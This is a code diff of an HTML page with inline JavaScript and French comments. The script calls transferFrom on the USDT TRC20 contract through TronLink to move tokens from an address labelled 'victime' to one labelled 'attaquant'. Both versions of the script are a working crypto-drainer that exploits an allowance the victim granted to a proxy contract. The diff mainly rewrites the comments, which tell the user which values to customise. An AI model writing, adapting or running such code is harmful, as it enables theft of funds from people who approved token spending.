@@ -10,49 +10,46 @@
   <button id="transferBtn">Exécuter transferFrom</button>
 
   <script>
-    // --- A PERSONNALISER ---
-    // Adresse TRON de la victime (celle qui a donné l'autorisation)
-    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T"; 
+    // ⚠️ A PERSONNALISER : Adresse TRON de la victime (a approuvé le proxy)
+    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T";
 
-    // Adresse TRON de l'attaquant (ton adresse qui va recevoir les tokens)
-    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41"; 
+    // ⚠️ A PERSONNALISER : Adresse TRON qui reçoit les USDT
+    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41";
 
-    // Adresse du token USDT TRC20 (contrat officiel)
+    // ⚠️ Adresse du token TRC20 USDT (fixe, officiel)
     const tokenContractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
 
-    // Adresse du smart contrat ApproveProxy (celui que la victime a approuvé)
+    // ⚠️ Adresse du contrat proxy approuvé (pour info, pas utilisé ici directement)
     const proxyContractAddress = "TAo4rwUGQovSD9F3qSeecUAsJsyzLetWpH";
 
-    // Connexion à TronLink (extension ou app mobile)
     async function runTransferFrom() {
       if (!window.tronWeb || !window.tronWeb.ready) {
-        alert("Veuillez vous connecter à TronLink !");
+        alert("❌ Veuillez ouvrir dans le navigateur TronLink et vous connecter !");
         return;
       }
 
       const tronWeb = window.tronWeb;
 
-      // Instanciation du contrat USDT TRC20 (ERC20 compatible)
-      const tokenContract = await tronWeb.contract().at(tokenContractAddress);
-
       try {
-        // Appel de la fonction transferFrom du token
-        // from: adresse de la victime (celle qui a donné l'autorisation)
-        // to: adresse de l'attaquant (celle qui reçoit les tokens)
-        // amount: montant à transférer (en sun, ici 10 USDT = 10 * 10^6)
-        const amount = 1 * 1_000_000; // 10 USDT, personnalise si besoin
+        // 📦 Chargement du contrat USDT
+        const tokenContract = await tronWeb.contract().at(tokenContractAddress);
 
+        // ⚠️ A PERSONNALISER : montant à transférer (en SUN, 1 USDT = 1_000_000 SUN)
+        const amount = 1 * 1_000_000;
+
+        // 🔁 Appel à transferFrom depuis le compte connecté
         const tx = await tokenContract.transferFrom(victim, attacker, amount).send({
-          feeLimit: 1_000_000,
+          feeLimit: 1_000_000
         });
 
-        alert("Transaction envoyée, txID : " + tx);
+        alert("✅ Transaction envoyée : " + tx);
       } catch (error) {
-        console.error("Erreur lors de transferFrom :", error);
-        alert("Erreur : " + error.message);
+        console.error("❌ Erreur transferFrom :", error);
+        alert("Erreur : " + (error?.message || error));
       }
     }
 
+    // 🎯 Clic bouton
     document.getElementById("transferBtn").addEventListener("click", runTransferFrom);
   </script>
 </body>
